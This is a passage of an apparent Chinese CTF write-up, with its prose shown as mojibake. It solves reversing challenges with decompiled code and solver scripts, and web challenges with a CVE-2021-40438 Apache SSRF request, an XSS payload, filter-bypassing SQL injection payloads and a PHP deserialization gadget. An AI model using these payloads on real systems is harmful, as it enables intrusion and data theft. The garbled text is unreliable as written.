ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v11); result = 1LL; &#125; else &#123; for ( i = 6; i &lt;= 33; ++i ) &#123; switch ( *((_BYTE *)&amp;v15 + i) ) &#123; case 0x30: v21 += 512; break; case 0x31: v21 += 64; break; case 0x32: v21 += 8; break; case 0x33: ++v21; break; default: v12 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v12); return 1LL; &#125; if ( unk_404020[v21] != 32 || v21 &gt; 4095 ) &#123; v13 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Failed&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v13); return 1LL; &#125; &#125; v14 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Win&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v14); result = 0LL; &#125; &#125; return result;&#125; é€»è¾‘è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œè¯»æ‡‚ä»£ç åæˆ‘ä»¬å‘ç°flagå°±æ˜¯ç”±0,1,2,3è¿™å››ä¸ªæ•°å­—ç»„æˆçš„ï¼Œç„¶åç¿»æ±‡ç¼–æˆ‘ä»¬å¯ä»¥å‘ç°åé¢æœ‰ä¸€æ’#å·å’Œç©ºæ ¼äº¤å‰çš„ä¼ªå­—ç¬¦ä¸²ã€‚v15æ˜¯æˆ‘ä»¬çš„flagï¼Œv21å°±æ˜¯åé¢ä¸€æ’ä¼ªå­—ç¬¦ä¸²çš„ä½ç½®ã€‚æ ¹æ®ç©ºæ ¼ä¹‹é—´å·®äº†å‡ ä¸ª#ï¼Œå¯¹åº”ç€0,1,2,3ï¼Œå…·ä½“å¯ä»¥æ ¹æ®ä¸Šé¢çš„ä¼ªä»£ç åˆ¤æ–­ã€‚ ç„¶åå› ä¸ºæˆ‘æ‡’ï¼Œå°±æ²¡å†™è„šæœ¬äº†ï¼Œç›´æ¥æ‰‹ç®—äº†ï¼Œå¾—å‡ºflagï¼š upx magic 0ç¬‘æ­»ï¼Œè¿™é¢˜é™„ä»¶ç»™é”™äº†ï¼Œç»™äº†ä¸ªè„±å£³åçš„æ–‡ä»¶ï¼Œæœ¬æ¥æ˜¯ä¸ä¼šè„±å£³çš„ã€‚åŒæ ·å…ˆçœ‹ä¼ªä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960sub_40FAC0((unsigned __int64)&quot;%40s&quot;); if ( sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41) != (signed __int64 (__usercall *)@&lt;rax&gt;(__int64@&lt;rax&gt;, unsigned __int64@&lt;rdi&gt;, __int128@&lt;xmm0&gt;, __m256i@&lt;ymm0&gt;))32 ) &#123; sub_40F940((unsigned __int64)&quot;length error&quot;); sub_40ED20(0LL); &#125; for ( i = 0; i &lt; (unsigned __int64)sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41); ++i ) &#123; v6 = *((char *)&amp;v41 + i) &lt;&lt; 8; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( v6 &amp; 0x8000 ) v6 = 2 * v6 ^ 0x1021; else v6 *= 2; &#125; v40[i] = (unsigned __int16)v6; &#125; v8 = 36200; v9 = 40265; v10 = 10770; v11 = 43802; v12 = 52188; v13 = 47403; v14 = 11826; v15 = 40793; v16 = 56781; v17 = 40265; v18 = 43274; v19 = 3696; v20 = 62927; v21 = 2640; v22 = 23285; v23 = 65439; v24 = 40793; v25 = 48395; v26 = 22757; v27 = 14371; v28 = 48923; v29 = 30887; v30 = 43802; v31 = 18628; v32 = 43274; v33 = 11298; v34 = 40793; v35 = 23749; v36 = 24277; v37 = 30887; v38 = 9842; v39 = 22165; if ( (unsigned int)sub_400490(v40, &amp;v8, 32LL) ) &#123; v0 = &quot;Wrong&quot;; sub_4107A0(&quot;Wrong&quot;); &#125; else &#123; v0 = &quot;Great,your input is flag&quot;; sub_4107A0(&quot;Great,your input is flag&quot;); &#125; é€»è¾‘ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œä¸€ä¸ªcrc16åŠ å¯†é€»è¾‘ï¼Œç›´æ¥å†™è„šæœ¬è§£å‡ºæ¥å°±å¯ä»¥äº†ï¼š 123456789101112list = [0x8d68,0x9d49,0x2a12,0xab1a,0xcbdc,0xb92b,0x2e32,0x9f59,0xddcd,0x9d49,0xa90a,0xe70,0xf5cf,0xa50,0x5af5,0xff9f,0x9f59,0xbd0b,0x58e5,0x3823,0xBF1B,0x78a7,0xab1a,0x48c4,0xa90a,0x2c22,0x9f59,0x5cc5,0x5ed5,0x78a7,0x2672,0x5695]flag = &#x27;&#x27;for b in list: for i in range(0,8): if(b &amp; 1): b = (b ^ 0x1021) // 2 b ^= 0x8000 else: b //= 2 b = b &gt;&gt; 8 flag += chr(b)print(flag) å¾—åˆ°flagï¼š fake shellè¿™é¢˜æœ€åæ‰å¼„å®Œçš„ï¼Œé€»è¾‘è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ï¼Œä½†æ˜¯è¿™é¢˜æœ€å‘çš„ç‚¹åœ¨äºæ‰§è¡Œä¸»å‡½æ•°ä¹‹å‰çš„åˆå§‹åŒ–å·å·è·‘äº†ä¸ªå‡½æ•°ï¼ŒæŠŠåŸæ¥çš„â€œhappyhg4me!â€æ›¿æ¢æˆäº†â€œw0wy0ugot1tâ€ï¼Œå¯¼è‡´ä¸€ç›´è·‘ä¸å‡ºæ¥ã€‚åæ¥æ”¾æç¤ºæ‰æ³¨æ„åˆ°ã€‚ æ­£å‘é€»è¾‘è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œå…³é”®ä¼ªä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152unsigned int64 sub_1358(int64 a1)&#123; char v4; // [rsp+27h] [rbp-119h] int i; // [rsp+28h] [rbp-118h] int j; // [rsp+28h] [rbp-118h] int v7; // [rsp+2Ch] [rbp-114h] int64 v8[33]; // [rsp+30h] [rbp-110h] BYREF char a2=&quot;happyhg4me!&quot;; int a3=11; v7 = 0; memset(a1, 0, 256); memset(v8, 0, 256); for ( i = 0; i &lt;= 255; ++i ) &#123; *(_BYTE *)(i + a1) = i; *((_BYTE *)v8 + i) = *(_BYTE *)(i % a3 + a2); &#125; for ( j = 0; j &lt;= 255; ++j ) &#123; v7 = (*((char *)v8 + j) + v7 + *(unsigned int8 *)(j + a1)) % 256; v4 = *(_BYTE *)(j + a1); *(_BYTE *)(j + a1) = *(_BYTE *)(v7 + a1); *(_BYTE *)(a1 + v7) = v4; &#125; return 0;&#125;unsigned int64 sub_1635(int64 a1, int64 a2, unsigned int64 a3)&#123; unsigned int64 result; // rax char v4; // [rsp+23h] [rbp-15h] int v5; // [rsp+24h] [rbp-14h] int v6; // [rsp+28h] [rbp-10h] unsigned int64 i; // [rsp+30h] [rbp-8h] v5 = 0; v6 = 0; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned int8 *)(v5 + a1)) % 256; v4 = *(_BYTE *)(v5 + a1); *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1); *(_BYTE *)(a1 + v6) = v4; *(_BYTE *)(a2 + i) ^= *(_BYTE *)((unsigned int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1); &#125; return result;&#125; æœ€åç»™å‡ºäº†åŠ å¯†å®Œçš„æ•°æ®ï¼Œè®°ä½é€†åºï¼Œå†™è„šæœ¬è·‘flagï¼š 1234567891011121314151617181920212223242526272829a1 = []a2=&quot;w0wy0ugot1t&quot;v7=0v8=[]for i in range(0, 256): a1.append(i) v8.append(ord(a2[i%11]))for j in range(0, 256): v4 =a1[j] v7=(v8[j]+v7+v4)%256 a1[j]=a1[v7] a1[v7]=v4v5 = 0v6 = 0flag=[0xB6,0x94,0xFA,0x8F,0x3D,0x5F,0xB2,0xE0,0xEA,0x0F,0xD2,0x66,0x98,0x6C,0x9d,0xe7,0x1b,0x08,0x40,0x71,0xc5,0xbe,0x6f,0x6d,0x7c,0x7b,0x09,0x8d,0xa8,0xbd,0xf3,0xf6]s=&#x27;&#x27;for j in range(0, 32): v5 = (v5 + 1) % 256 v4=a1[v5] v6 = (v6 + v4) % 256 a1[v5]=a1[v6] a1[v6]=v4 t=(a1[v5]+a1[v6])% 256 t1=flag[j] t1^=a1[t] s+=chr(t1)print(s) å¾—åˆ°flagï¼š creakme2å’Œcreakmeç›¸ä¼¼ï¼Œéƒ½æ˜¯xteaé€»è¾‘ï¼Œä½†æ˜¯è¿™é‡Œåšäº†ä¸ªWindows SEH å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå³é™¤é›¶æŠ¥é”™ã€‚è§£å†³æ–¹æ³•æ˜¯åˆ¤æ–­æ•°æ®å¾ªç¯ä¸­è®¡ç®—åæ˜¯å¦ä¸ºæ­£æ•°ï¼Œä¸ºæ­£æ•°åˆ™ä¸0x1234567è¿›è¡Œä¸€æ¬¡å¼‚æˆ–ã€‚ ç›´æ¥æ”¹xteaè„šæœ¬ï¼š 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; //è¿™é‡ŒåŠ å¯†é€»è¾‘å˜äº†åˆå§‹samå€¼å¯ä»¥è·‘æ­£å‘é€»è¾‘å¾—åˆ° for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); if((sum &gt;&gt; 31) == 0)&#123; sum ^= 0x1234567; &#125; sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[ 0]=v0; v[1]=v1;&#125;int main()&#123; int i; uint32_t v[8]=&#123;0x457E62CF,0x9537896C,0x1F7E7F72,0x0F7A073D8,0x8E996868,0x40AFAF99,0x0F990E34,0x196F4086&#125;; uint32_t const k[4]=&#123;1,2,3,4&#125;; unsigned int r=32; for (i = 0; i &lt; 4;i++)&#123; decipher(r, (v+i*2), k); printf(&quot;è§£å¯†åçš„æ•°æ®:%x %x\\n&quot;,v[i*2],v[i*2+1]); &#125; return 0;&#125; åå…­è¿›åˆ¶é€†å‘ä¸€ä¸‹è·‘å‡ºæ¥å°±æ˜¯flagäº†ï¼š upx magic 1ï¼ˆèµ›åï¼‰è¿™é‡Œæ²¡åŠæ³•ç›´æ¥upx -dè„±å£³çš„åŸå› æ˜¯æ”¹äº†upxçš„å¤´å°¾tagï¼Œå› æ­¤æˆ‘ä»¬è¦æŠŠå€¼ç»™æ”¹å›æ¥ï¼Œå³æ”¹æ­£ä¸º55 50 58 21ï¼Œæ”¹æ­£åå°±å¯ä»¥ç›´æ¥è„±å£³äº†ã€‚åŠ å¯†é€»è¾‘åŒæ ·æ˜¯crc16ï¼Œè„šæœ¬ä¹Ÿå’Œä¸Šé¢ä¸€æ ·ã€‚ WEBApache!æ‰“å¼€ç½‘é¡µå‘ç°æç¤ºwww.zipï¼Œä¸‹è½½é™„ä»¶åå‘ç°å››ä¸ªé…ç½®æ–‡ä»¶ï¼Œåˆ†åˆ«ä¸ºhttpd.confã€httpd-vhosts.confã€docker-compose.ymlå’Œdefault.confã€‚é€šè¿‡å®¡è®¡é…ç½®æ–‡ä»¶å’Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬æ‰“å…¥æœ¬åœ°å†…ç½‘ï¼Œåˆ¤æ–­è€ƒç‚¹æ˜¯åˆ©ç”¨apacheæ¼æ´è¿›è¡Œssrfã€‚ æœç´¢ç›¸å…³æ¼æ´ã€‚å‘ç°CVE-2021-40438æ¼æ´ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œssrfæ‰“æœ¬åœ°ã€‚å…³äºè¿™ä¸ªæ¼æ´å¯ä»¥å‚è€ƒä¸‹é¢çš„å‡ ç¯‡æ–‡ç« ï¼šApache httpd Server CVE-2021-40438 æ¼æ´åˆ†æApache mod_proxy SSRFï¼ˆCVE-2021-40438ï¼‰çš„ä¸€ç‚¹åˆ†æå’Œå»¶ä¼¸ æ„é€ è¯·æ±‚å¤´ï¼š 123456789101112GET /proxy/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: _ga=GA1.2.472555996.1642680122; __gads=ID=ffd6fa567afacd7b-22ce67c00cd00047:T=1642680123:RT=1642680123:S=ALNI_MYrs7iSPv9n3RCqflSqd4vkDHHHBAUpgrade-Insecure-Requests: 1If-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMTIf-None-Match: &quot;22a-5d664045f9580&quot;Cache-Control: max-age=0 å¾—åˆ°flagï¼š webpack-engineåˆæ˜¯ä¸€é¢˜ç½‘é¡µæºä»£ç æŸ¥æ‰¾é¢˜ï¼Œè¿™é¢˜æŠŠflagè—åœ¨CSSé‡Œäº†ã€‚å…ˆç‚¹å‡»å‡ æ¬¡æŒ‰é’®ï¼Œç„¶åé¡µé¢è·³è½¬åˆ°ã€ŠNever Gonna Give You Upã€‹åç¿»å¼€CSSå³å¯æ‰¾åˆ°flagï¼š è§£ä¸¤æ¬¡base64å¾—åˆ°flagï¼š At0mçš„ç•™è¨€æ¿xssï¼Œåšå¤ªå°‘äº†ï¼Œè¾“å‡ºé‚£å—çŸ¥è¯†ç›²åŒºäº†ä¸€æ³¢ï¼Œç›´æ¥ç»™payloadï¼š 1&lt;img src=&quot;x&quot; onerror=&quot;this.alt=document.getElementsByTagName(&#x27;script&#x27;)[0].innerHTML&quot;/&gt; è·å¾—flagï¼š Pokemonsqlæ³¨å…¥é¢˜ï¼Œæˆ‘åšçš„æ—¶å€™ç¾¤é‡Œæ²¡ç»™éƒ¨åˆ†æºç ï¼Œæ‰€ä»¥æ˜¯fuzzçš„ï¼Œåé¢ç»™äº†å…³é”®æºç ï¼š å› æ­¤åŒå†™ç»•è¿‡+è”åˆæ³¨å…¥å°±å¯ä»¥äº†ï¼Œpayloadï¼š 1234567891011121314151617181920?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(schema_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.schemata%23//information_schema,pokemon?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon&#x27;%23//errors,fllllllllaaaaaag?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon&#x27;/*/**/*/anandd/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;%23//flag?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(flag)/*/**/*/frfromom/*/**/*/fllllllllaaaaaag%23//hgame&#123;C0n9r@tul4tiOn*Y0u$4r3_sq1_M4ST3R#&#125; ä¸€æœ¬å•è¯ä¹¦åŒæ ·æ˜¯æç¤ºwww.zipï¼Œä¸‹è½½é™„ä»¶ï¼Œå‘ç°å¥½å‡ ä¸ªphpï¼Œé€ä¸€å®¡è®¡ä»£ç ï¼Œç¡®å®špingã€saveã€admin_checkè¿™ä¸‰ä¸ªphpæ–‡ä»¶ä¸æ³¨å…¥æ— å…³ï¼Œloginå¤„æœ‰ä¸€ä¸ªé»‘é­”æ³•ç»•è¿‡ï¼Œgetã€indexã€evilä¸‰ä¸ªæ–‡ä»¶æœ‰ä¸€ä¸ªphpååºåˆ—åŒ–è€ƒæŸ¥ã€‚ é¦–å…ˆæ˜¯login.phpéƒ¨åˆ†ä»£ç ï¼š 123456789101112131415if ($_POST[&#x27;username&#x27;] != &#x27;adm1n&#x27;) &#123; die(alert(&#x27;username or password is invalid&#x27;));&#125;if (is_numeric($_POST[&#x27;password&#x27;])) &#123; die(alert(&#x27;å¯†ç ä¸èƒ½è®¾ç½®ä¸ºçº¯æ•°å­—ï¼Œæˆ‘å¦ˆéƒ½çŸ¥é“(ï¿£â–³ï¿£ï¼›)&#x27;));&#125; else &#123; if ($_POST[&#x27;password&#x27;] == 1080) &#123; $_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;; $_SESSION[&#x27;unique_key&#x27;] = md5(randomString(8)); header(&#x27;Location: index.php&#x27;); &#125; else &#123; die(alert(&#x27;è¿™ä½ éƒ½èƒ½è¾“é”™ï¼Ÿ&#x27;)); &#125;&#125; ä»£ç é€»è¾‘æ˜¯éªŒè¯è´¦å·ä¸ºadm1nï¼Œå¯†ç ä¸º1080ï¼Œä½†æ˜¯å¯†ç ä¸èƒ½ä¸ºçº¯æ•°å­—ï¼Œé»‘é­”æ³•ç»•è¿‡å³å¯ï¼š 1usernameï¼šadm1n passwordï¼š1080a æ¥ç€ç™»é™†æˆåŠŸè¿›å…¥åè¿›å…¥index.phpé¡µé¢ï¼Œå®¡è®¡æ ¸å¿ƒä»£ç ï¼š 123456789101112async function fresh() &#123; wordlist.innerHTML = &quot;&quot; const pool = (await axios.get(&quot;/get.php&quot;)).data if (pool.length == 0) &#123; pool[&#x27;abandon&#x27;] = &#x27;æ”¾å¼ƒ&#x27; &#125; for (const key in pool) &#123; const value = JSON.stringify(pool[key]) const html = `&lt;li&gt;&lt;span&gt;$&#123;key&#125;-&gt;&lt;/span&gt; &lt;span&gt;$&#123;value&#125;&lt;/span&gt;&lt;/li&gt;` wordlist.innerHTML += html &#125;&#125; éœ€è¦è°ƒç”¨åˆ°get.phpæ¥åšè¾“å…¥ï¼Œæ¥ç€å®¡è®¡get.phpæ ¸å¿ƒéƒ¨åˆ†ï¼š 1234567891011121314151617181920212223include &#x27;evil.php&#x27;;// flag is in /flagfunction decode(string $data): Array &#123; $result = []; $offset = 0; $length = \\strlen($data); while ($offset &lt; $length) &#123; if (!strstr(substr($data, $offset), &#x27;|&#x27;)) &#123; return []; &#125; $pos = strpos($data, &#x27;|&#x27;, $offset); $num = $pos - $offset; $varname = substr($data, $offset, $num); $offset += $num + 1; $dataItem = unserialize(substr($data, $offset)); $result[$varname] = $dataItem; $offset += \\strlen(serialize($dataItem)); &#125; return $result;&#125; è¿™ä¸ªå‡½æ•°å°†ä¼ å…¥çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯åªæ˜¯åˆ«|åé¢çš„éƒ¨åˆ†ï¼Œå› æ­¤åœ¨æ„å»ºååºåˆ—åŒ–åè¦åœ¨æœ€å‰é¢åŠ ä¸Š|ï¼Œæœ€ååˆ©ç”¨evil.phpè¿›è¡Œååºåˆ—åŒ–ï¼š 12345678910111213141516171819&lt;?phpclass Evil &#123; public $file=&#x27;/flag&#x27;; public $flag; public function __wakeup() &#123; $content = file_get_contents($this-&gt;file); if (preg_match(&quot;/hgame/&quot;, $content)) &#123; $this-&gt;flag = &#x27;hacker!&#x27;; &#125; $this-&gt;flag = $content; &#125;&#125;$a = new Evil;echo serialize($a);//O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;s:4:&quot;flag&quot;;N;&#125; æœ€åå°†ååºåˆ—åŒ–å†™å…¥ç½‘é¡µè·å–flagï¼š","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ã€hgame week1ã€‘write 